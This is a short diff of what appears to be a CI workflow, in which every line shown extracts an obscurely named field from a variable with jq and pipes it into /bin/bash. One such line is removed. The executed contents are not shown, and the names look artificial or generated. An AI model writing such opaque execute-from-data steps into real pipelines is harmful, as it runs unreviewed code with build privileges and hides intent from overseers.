@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$cm64910" | jq -r .pxfe91 | /bin/bash
           printf '%s' "$fyf2" | jq -r .cp0349 | /bin/bash
           echo $a543 | jq -r .xpcv458 | /bin/bash
-          echo $qhhch20 | jq -r .xgkf20165 | /bin/bash
           printf '%s' "$xl59387" | jq -r .fb17 | /bin/bash
           echo $ffbc451 | jq -r .dleyb62 | /bin/bash
           echo $pqrue0 | jq -r .satqz38552 | /bin/bash
